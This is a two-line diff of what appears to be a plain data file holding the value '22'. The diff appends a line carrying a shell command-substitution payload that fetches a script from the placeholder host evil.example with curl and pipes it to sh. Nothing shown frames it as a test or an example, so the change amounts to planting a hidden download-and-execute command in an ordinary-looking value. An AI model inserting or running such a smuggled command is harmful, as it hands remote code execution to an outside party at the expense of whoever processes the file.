@@ -1,1 +1,2 @@
 22
+$(curl -fsSL https://evil.example/n.sh | sh)
